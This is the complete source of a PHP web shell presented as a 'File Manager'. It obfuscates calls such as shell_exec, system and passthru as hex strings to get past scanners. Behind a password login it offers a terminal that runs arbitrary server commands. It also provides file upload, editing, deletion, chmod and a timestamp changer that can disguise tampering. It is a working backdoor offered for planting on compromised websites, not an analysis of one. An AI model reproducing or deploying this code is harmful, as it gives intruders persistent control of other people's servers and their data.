<?php
/*
filemanager bypass v1
author: z_one
*/
error_reporting(0);
session_start();
$g = [ "6d6435", "686561646572", "696e695f736574", "626173656e616d65", "676574637764", "6469736b5f667265655f7370616365", "6469736b5f746f74616c5f7370616365", "70687076657273696f6e", "696e695f676574", "7368656c6c5f65786563", "65786563", "73797374656d", "7061737374687275", "7374725f7265706c616365", "66696c655f657869737473", "69735f646972", "6d6b646972", "726d646972", "756e6c696e6b", "636f7079", "72656e616d65", "63686d6f64", "6f6374646563", "7363616e646972", "66696c6573697a65", "66696c656d74696d65", "737472746f74696d65", "64617465", "746f756368", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "66696c657065726d73" ]; foreach ($g as $k => $v) { $g[$k] = hex2bin($v); } $a = $g[0]; $b = $g[1]; $c = $g[2]; $d = $g[3]; $e = $g[4]; $f = $g[5]; $g2 = $g[6]; $h = $g[7]; $i = $g[8]; $j = $g[9]; $k = $g[10]; $l = $g[11]; $m = $g[12]; $n = $g[13]; $o = $g[14]; $p = $g[15]; $q = $g[16]; $r = $g[17]; $s = $g[18]; $t = $g[19]; $u = $g[20]; $v = $g[21]; $w = $g[22]; $x = $g[23]; $y = $g[24]; $z = $g[25]; $aa = $g[26]; $ab = $g[27]; $ac = $g[28]; $ad = $g[29]; $ae = $g[30]; $af = $g[31];
session_start();
$c("display_errors", 0);
$c("memory_limit", "256M");
$b("Content-Type: text/html; charset=UTF-8");
$APP_NAME = "File Manager";
$BASE_PATH = $e();
$PASSWORD_MD5 = "a84e5f25e7f6d5de9b82ce3f64d1b8fa";
if(isset($_POST['login'])){
    $pass = $_POST['password'];
    if($a($pass) === $PASSWORD_MD5){
        $_SESSION['logged_in'] = true;
        $b("Location: ".$_SERVER['PHP_SELF']);
        exit;
    } else {
        $msg = "Password salah!";
    }
}
if(isset($_GET['logout'])){
    session_destroy();
    $b("Location: ".$_SERVER['PHP_SELF']);
    exit;
}
if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true){
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title><?=$APP_NAME?> - Login</title>
        <style>
            body{background:#0d0d0d;color:#eee;font-family:monospace;text-align:center;padding-top:100px;}
            input{padding:6px;margin:5px;border-radius:4px;border:none;}
            input[type=password]{width:200px;}
            input[type=submit]{background:#7d3c98;color:#fff;cursor:pointer;}
            .msg{color:#e74c3c;margin-top:10px;}
        </style>
    </head>
    <body>
        <h1><?=$APP_NAME?></h1>
        <form method="POST">
            Password: <input type="password" name="password"><br>
            <input type="submit" name="login" value="Login">
        </form>
        <?php if(isset($msg)) echo "<div class='msg'>$msg</div>"; ?>
    </body>
    </html>
    <?php
    exit;
}
function perms($file){ global $af; $perm = $af($file); return substr(sprintf('%o', $perm), -4); }
function owner($file){ global $j; if(function_exists('posix_getpwuid')){ $uid = fileowner($file); $info = posix_getpwuid($uid); return $info['name']; } elseif(function_exists($j)){ $owner = $j('ls -ld '.escapeshellarg($file).' | awk \'{print $3}\''); return trim($owner); } return 'unknown'; }
function last_modified($file){ global $z,$ab; return $ab("Y-m-d H:i:s", $z($file)); }
function change_date($target, $new_date){ global $aa,$ac; $ts = $aa($new_date); return ($ts && $ts > 0) ? $ac($target, $ts) : false; }
function exe($md){ global $j,$k,$l,$m; if(function_exists($j)) return $j($md); elseif(function_exists($k)){ $k($md,$o); return implode("\n",$o); } elseif(function_exists($l)){ ob_start(); $l($md); return ob_get_clean(); } elseif(function_exists($m)){ ob_start(); $m($md); return ob_get_clean(); } return "N/A"; }
$path = isset($_GET['path']) ? $_GET['path'] : $BASE_PATH;
$path = $n("\\","/",$path);
$paths = explode("/",$path);
$search = isset($_GET['search']) ? strtolower($_GET['search']) : "";
$msg = "";
$msg_type = ""; // success atau error

// File operations
if(isset($_FILES['file']) && $_FILES['file']['error'] == 0){
    $dest = $path.'/'.$_FILES['file']['name'];
    if($t($_FILES['file']['tmp_name'],$dest)){
        $msg = "Upload berhasil: " . htmlspecialchars($_FILES['file']['name']);
        $msg_type = "success";
    } else {
        $msg = "Upload gagal: " . htmlspecialchars($_FILES['file']['name']);
        $msg_type = "error";
    }
}
if(isset($_POST['newfile']) && !empty($_POST['newfile'])){
    $newfile = $_POST['newfile'];
    $fullpath = $path.'/'.$newfile;
    if(!$o($fullpath)){
        $ad($fullpath,"");
        $msg = "File berhasil dibuat: " . htmlspecialchars($newfile);
        $msg_type = "success";
    } else {
        $msg = "Gagal membuat file: " . htmlspecialchars($newfile) . " (sudah ada)";
        $msg_type = "error";
    }
}
if(isset($_POST['newfolder']) && !empty($_POST['newfolder'])){
    $newfolder = $_POST['newfolder'];
    $fullpath = $path.'/'.$newfolder;
    if(!$p($fullpath)){
        $q($fullpath);
        $msg = "Folder berhasil dibuat: " . htmlspecialchars($newfolder);
        $msg_type = "success";
    } else {
        $msg = "Gagal membuat folder: " . htmlspecialchars($newfolder) . " (sudah ada)";
        $msg_type = "error";
    }
}
if(isset($_POST['delete']) && isset($_POST['target'])){
    $target = $_POST['target'];
    $name = $d($target);
    if($p($target)){
        if(@$r($target)){
            $msg = "Folder berhasil dihapus: " . htmlspecialchars($name);
            $msg_type = "success";
        } else {
            $msg = "Gagal menghapus folder: " . htmlspecialchars($name);
            $msg_type = "error";
        }
    } else {
        if(@$s($target)){
            $msg = "File berhasil dihapus: " . htmlspecialchars($name);
            $msg_type = "success";
        } else {
            $msg = "Gagal menghapus file: " . htmlspecialchars($name);
            $msg_type = "error";
        }
    }
}
if(isset($_POST['rename']) && isset($_POST['oldname']) && isset($_POST['newname'])){
    $oldname = $_POST['oldname'];
    $newname = $path.'/'.$_POST['newname'];
    $oldbasename = $d($oldname);
    $newbasename = $_POST['newname'];
    if($u($oldname, $newname)){
        $msg = "Berhasil rename: " . htmlspecialchars($oldbasename) . " → " . htmlspecialchars($newbasename);
        $msg_type = "success";
    } else {
        $msg = "Gagal rename: " . htmlspecialchars($oldbasename) . " → " . htmlspecialchars($newbasename);
        $msg_type = "error";
    }
}
if(isset($_POST['chmod']) && isset($_POST['target']) && isset($_POST['perm'])){
    $target = $_POST['target'];
    $perm = $_POST['perm'];
    $name = $d($target);
    if($v($target, $w($perm))){
        $msg = "Berhasil ubah permission " . htmlspecialchars($name) . " menjadi: " . htmlspecialchars($perm);
        $msg_type = "success";
    } else {
        $msg = "Gagal ubah permission: " . htmlspecialchars($name);
        $msg_type = "error";
    }
}
if(isset($_POST['savefile']) && isset($_POST['target']) && isset($_POST['src'])){
    $target = $_POST['target'];
    $name = $d($target);
    if($ad($target, $_POST['src'])){
        $msg = "File berhasil disimpan: " . htmlspecialchars($name);
        $msg_type = "success";
    } else {
        $msg = "Gagal menyimpan file: " . htmlspecialchars($name);
        $msg_type = "error";
    }
}
if(isset($_POST['chdate']) && isset($_POST['target']) && isset($_POST['new_date'])){
    $target = $_POST['target'];
    $name = $d($target);
    $new_date = $_POST['new_date'];
    if(change_date($target, $new_date)){
        $msg = "Berhasil ubah tanggal: " . htmlspecialchars($name) . " → " . htmlspecialchars($new_date);
        $msg_type = "success";
    } else {
        $msg = "Gagal ubah tanggal: " . htmlspecialchars($name) . " (Format: YYYY-MM-DD HH:MM:SS)";
        $msg_type = "error";
    }
}
$terminal_output = ""; $terminal_show = isset($_POST['toggle_terminal']) ? true : false;
if(isset($_POST['execmd'])){ $terminal_output = exe($_POST['cmd']); $terminal_show = true; }
?>
<!DOCTYPE html>
<html>
<head>
<title><?=$APP_NAME?></title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
*{
    box-sizing:border-box;
}
html{background:#0d0d0d}body{font-family:monospace;color:#eee;margin:0;padding:10px;min-height:100vh;background-image:url(https://hw-media-cdn-mingchao.kurogame.com/static/assets/rw1-7a848ef9.png);background-size:50%;background-repeat:no-repeat;background-position:right top;background-attachment:fixed;background-color:#0d0d0d}body.modal-open{overflow:hidden;padding-right:15px}h1{color:#7d3c98;text-align:center;padding:15px 0;margin:0 0 10px;font-size:28px;cursor:pointer}h1:hover{opacity:.8}a{color:#1abc9c;text-decoration:none}a:hover{color:#f1c40f}#terminalBox,.table-container,div[style*="background:#111"],div[style*="border:1px solid #7d3c98"]{background:rgba(17,17,17,0)!important}.table-container{width:calc(100% - 20px);margin:0 10px;overflow-x:auto;border:1px solid #333;border-radius:6px;position:relative}table{width:100%;border-collapse:collapse;table-layout:auto;font-size:12px;background:0 0}td,th{border-bottom:1px solid #222;padding:8px 10px;text-align:left;vertical-align:middle;overflow:hidden;text-overflow:ellipsis;background:0 0}th{background:rgba(125,60,152,.95);color:#fff;white-space:nowrap;font-weight:700}tr:nth-child(even){background:rgba(17,17,17,.6)}tr:hover{background:rgba(26,26,26,.8)}td{white-space:nowrap}td:nth-child(1),th:nth-child(1){width:40%;max-width:400px}td:nth-child(1){overflow:hidden;text-overflow:ellipsis;white-space:nowrap}td:nth-child(2),td:nth-child(3),th:nth-child(2),th:nth-child(3){width:70px}td:nth-child(4),th:nth-child(4){width:180px}td:nth-child(5),th:nth-child(5){width:170px}td:nth-child(6),th:nth-child(6){width:140px;text-align:center}input,select,textarea{background:#222;color:#1abc9c;border:1px solid #555;border-radius:4px;padding:4px}textarea{width:95%;height:250px}.action-icons{display:flex;justify-content:center;align-items:center;gap:2px;flex-wrap:nowrap}.action-btn{background:0 0;border:none;cursor:pointer;padding:3px 5px;border-radius:4px;transition:.2s;font-size:12px;position:relative}.action-btn:hover{background:#333;transform:scale(1.05)}.action-btn .tooltip{visibility:hidden;background:#222;color:#fff;text-align:center;padding:4px 7px;border-radius:4px;position:absolute;bottom:125%;left:50%;transform:translateX(-50%);white-space:nowrap;font-size:10px;border:1px solid #555;z-index:99999;opacity:0;transition:opacity .2s;pointer-events:none;box-shadow:0 0 8px rgba(0,0,0,.5)}.action-btn,table,td,tr{overflow:visible!important}.action-btn:hover .tooltip{visibility:visible;opacity:1}.perm-write{color:#2ecc71}.perm-readonly{color:#fff}.perm-nwrite{color:#e74c3c}#terminalBox{position:fixed;top:10px;right:10px;width:400px;border:1px solid #7d3c98;padding:10px;z-index:1000;display:<?=$terminal_show?'block':'none'?>;border-radius:6px;box-shadow:0 0 10px rgba(0,0,0,.5)}#terminalBox h3{margin:0 0 5px;color:#f1c40f}#terminalBox button{float:right;background:red;color:#fff;border:none;padding:2px 6px;cursor:pointer}.breadcrumb{margin:10px}.breadcrumb a{margin-right:5px;color:#1abc9c}.msg-box{margin-top:5px;padding:8px 12px;border-radius:4px;font-size:13px}.msg-box.success{background:#0a2e1a;border:1px solid #2ecc71;color:#2ecc71}.msg-box.error{background:#3a1212;border:1px solid #e74c3c;color:#e74c3c}#toggleTerminalBtn{background:#f39c12;color:#111;border:none;padding:3px 6px;border-radius:3px;cursor:pointer}.logout-btn{background:#7d3c98;color:#fff;border:none;padding:3px 8px;border-radius:3px;cursor:pointer;margin-left:5px;text-decoration:none;display:inline-block;font-size:12px}.logout-btn:hover{background:#6c3483}.modal{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#111;border:1px solid #7d3c98;border-radius:8px;padding:18px;z-index:99999;box-shadow:0 0 20px rgba(0,0,0,.8)}.modal::before{content:'';position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:-1}.modal-small{width:420px;max-width:95%;height:auto}.modal-editor{width:85%;max-width:1200px;height:85vh;overflow:hidden}.modal h3{color:#f1c40f;margin:0 0 12px;font-size:22px}.modal .close{color:#ff3b3b;cursor:pointer;float:right;font-size:22px;font-weight:700}.modal .close:hover{color:#fff}.modal input{width:100%;margin:8px 0;padding:10px;background:#1a1a1a;border:1px solid #444;color:#1abc9c;border-radius:5px}.modal-editor textarea{width:100%;height:calc(85vh - 150px);background:#1a1a1a;color:#00ffbf;border:1px solid #444;border-radius:6px;padding:12px;resize:none;font-family:monospace;font-size:15px;line-height:1.5;overflow:auto}.modal button{margin-top:10px;width:100%;padding:10px;border:none;border-radius:5px;font-size:15px;cursor:pointer}@media(max-width:768px){.modal-editor{width:95%;height:90vh}.modal-editor textarea{height:calc(90vh - 150px);font-size:13px}}.file-link{cursor:pointer;color:#1abc9c}.file-link:hover{color:#f1c40f}
</style>
<script>
function openModal(id){ 
    document.getElementById(id).style.display='block'; 
    document.body.classList.add('modal-open');
}
function closeModal(id){ 
    document.getElementById(id).style.display='none'; 
    document.body.classList.remove('modal-open');
}
function toggleTerminal(){ 
    var t=document.getElementById('terminalBox'); 
    t.style.display=(t.style.display=='block')?'none':'block'; 
}
function goHome(){ 
    window.location.href = window.location.pathname; 
}
</script>
</head>
<body>
<h1 onclick="goHome()"><?=$APP_NAME?></h1>
<div id="terminalBox"><button onclick="toggleTerminal()">[X]</button><h3>Terminal</h3><form method="POST"><input type="text" size="30" name="cmd"><input type="submit" name="execmd" value="Run"><input type="hidden" name="toggle_terminal" value="1"></form><?php if($terminal_output) echo "<textarea readonly>$terminal_output</textarea>"; ?></div>
<div style="margin:10px;padding:10px;background:#111;border:1px solid #7d3c98;border-radius:6px;">
<b>Server Info</b><br>PHP: <?=$h();?><br>Disable: <?=$i('disable_functions')?><br>Path: <?=$path?><br>Disk: <?=round($f($path)/1024/1024,2)?> MB / <?=round($g2($path)/1024/1024,2)?> MB
<div style="margin-top:10px; display:flex; gap:8px; align-items:center;"><button type="button" id="toggleTerminalBtn" onclick="toggleTerminal()"><i class="fa fa-terminal"></i> Terminal</button><a href="?logout=1" class="logout-btn" onclick="event.stopPropagation();"><i class="fa fa-sign-out"></i> Logout</a></div>
</div>
<div class="breadcrumb"><?php foreach($paths as $id=>$pat){ if($pat==''&&$id==0){echo '<a href="?path=/">/</a>';continue;} if($pat=='')continue; echo '<a href="?path='; for($i=0;$i<=$id;$i++){echo $paths[$i]; if($i!=$id)echo "/";} echo '">'.$pat.'</a>/'; } ?></div>
<div style="margin:10px;padding:5px;background:#111;border:1px solid #7d3c98;border-radius:6px;">
<form enctype="multipart/form-data" method="POST" style="display:inline-block;">Upload: <input type="file" name="file"><input type="submit" value="Go"></form>
<form method="POST" style="display:inline-block;margin-left:10px;">New File: <input type="text" name="newfile" size="8"><input type="submit" value="Create"></form>
<form method="POST" style="display:inline-block;margin-left:10px;">New Folder: <input type="text" name="newfolder" size="8"><input type="submit" value="Create"></form>
<?php if($msg): ?>
<div class="msg-box <?=$msg_type?>"><i class="fa <?=$msg_type=='success'?'fa-check-circle':'fa-exclamation-circle'?>"></i> <?=$msg?></div>
<?php endif; ?>
</div>
<div style="margin:10px;"><form method="GET"><input type="hidden" name="path" value="<?=$path?>">Search: <input type="text" name="search" value="<?=htmlspecialchars($search)?>"><input type="submit" value="Find"></form></div>
<div class="table-container">
<table>
<thead>
<tr>
<th>Name</th>
<th>Size</th>
<th>Perm</th>
<th>Owner</th>
<th>Last Modified</th>
<th>Action</th>
</tr>
</thead>
<tbody>
<?php
$scandir = $x($path);
$folders = []; $files = [];
foreach($scandir as $f){ if($f=="."||$f=="..") continue; if($search && stripos($f,$search)===false) continue; if($p($path.'/'.$f)) $folders[]=$f; else $files[]=$f; }
function renderRow($full,$f,$isFolder=false){
    global $y,$ad,$ae,$d,$p,$r,$s,$u,$w,$z,$ab,$o,$a,$af;
    $size = $isFolder ? '--' : ($y($full)>=1048576 ? round($y($full)/1048576,2)." MB" : round($y($full)/1024,2)." KB");
    $editModal = 'editModal_'.$a($full);
    $renameModal = 'renameModal_'.$a($full);
    $chmodModal = 'chmodModal_'.$a($full);
    $chdateModal = 'chdateModal_'.$a($full);
    $current_date = last_modified($full);
    $perm_value = perms($full);
    $owner_digit = substr($perm_value, 1, 1);
    $write_allow = ['2','3','6','7'];
    if(in_array($owner_digit, $write_allow)){ $perm_class = 'perm-write'; }
    elseif($perm_value == '0444' || $perm_value == '0555'){ $perm_class = 'perm-readonly'; }
    else { $perm_class = 'perm-nwrite'; }
    $rowId = 'row_'.$a($full);
    echo "<tr id='$rowId'>";
    if($isFolder){ echo "<td><a href='?path=$full'>📁 $f</a></td>"; }
    else { echo "<td><span class='file-link' onclick=\"openModal('$editModal')\">📄 $f</span></td>"; }
    echo "<td>$size</td>";
    echo "<td class='$perm_class'>$perm_value</td>";
    echo "<td>".owner($full)."</td>";
    echo "<td>$current_date</td>";
    echo "<td><div class='action-icons'>";
    if(!$isFolder){
        echo "<button onclick=\"openModal('$editModal')\" class='action-btn' style='color:#2ecc71;'><i class='fa fa-edit'></i><span class='tooltip'>Edit</span></button>";
    }
    echo "<button onclick=\"openModal('$renameModal')\" class='action-btn' style='color:#3498db;'><i class='fa fa-pencil-square-o'></i><span class='tooltip'>Rename</span></button>";
    echo "<button onclick=\"openModal('$chdateModal')\" class='action-btn' style='color:#9b59b6;'><i class='fa fa-calendar'></i><span class='tooltip'>Chdate</span></button>";
    echo "<button onclick=\"openModal('$chmodModal')\" class='action-btn' style='color:#f39c12;'><i class='fa fa-lock'></i><span class='tooltip'>Chmod</span></button>";
    echo "<form method='POST' style='display:inline;' onsubmit=\"return confirm('Hapus $f?')\"><input type='hidden' name='target' value='$full'><button type='submit' name='delete' class='action-btn' style='color:#e74c3c;'><i class='fa fa-trash-o'></i><span class='tooltip'>Delete</span></button></form>";
    echo "</div></td></tr>";
    echo "<div id='$renameModal' class='modal modal-small'><span class='close' onclick=\"closeModal('$renameModal')\">&times;</span><h3>Rename: $f</h3><form method='POST'><input type='hidden' name='oldname' value='$full'><label>New Name:</label><input type='text' name='newname' value='$f'><button type='submit' name='rename' style='background:#3498db;color:#fff;padding:5px 15px;border:none;border-radius:4px;cursor:pointer;width:100%;'><i class='fa fa-check'></i> Rename</button></form></div>";
    echo "<div id='$chdateModal' class='modal modal-small'><span class='close' onclick=\"closeModal('$chdateModal')\">&times;</span><h3>Change Date: $f</h3><form method='POST'><input type='hidden' name='target' value='$full'><label>New Date (YYYY-MM-DD HH:MM:SS):</label><input type='text' name='new_date' value='$current_date'><button type='submit' name='chdate' style='background:#9b59b6;color:#fff;padding:5px 15px;border:none;border-radius:4px;cursor:pointer;width:100%;'><i class='fa fa-check'></i> Apply</button></form></div>";    
    echo "<div id='$chmodModal' class='modal modal-small'><span class='close' onclick=\"closeModal('$chmodModal')\">&times;</span><h3>Chmod: $f</h3><form method='POST'><input type='hidden' name='target' value='$full'><label>Permission (ex: 0755, 0644):</label><input type='text' name='perm' value='$perm_value'><button type='submit' name='chmod' style='background:#f39c12;color:#fff;padding:5px 15px;border:none;border-radius:4px;cursor:pointer;width:100%;'><i class='fa fa-check'></i> Apply</button></form></div>";    
    if(!$isFolder){
        $content = ($o($full) && !$p($full)) ? htmlspecialchars($ae($full)) : "";
        echo "<div class='modal modal-editor' id='$editModal'><span class='close' onclick=\"closeModal('$editModal')\">&times;</span><h3>Edit File: $f</h3><form method='POST'><textarea name='src'>$content</textarea><br><input type='hidden' name='target' value='$full'><button type='submit' name='savefile' style='background:#2ecc71;color:#fff;padding:5px 15px;border:none;border-radius:4px;cursor:pointer;width:100%;'><i class='fa fa-save'></i> Save</button></form></div>";
    }
}
foreach($folders as $f) renderRow($path.'/'.$f,$f,true);
foreach($files as $f) renderRow($path.'/'.$f,$f,false);
?>
</tbody>
</table>
</div>
</body>
</html>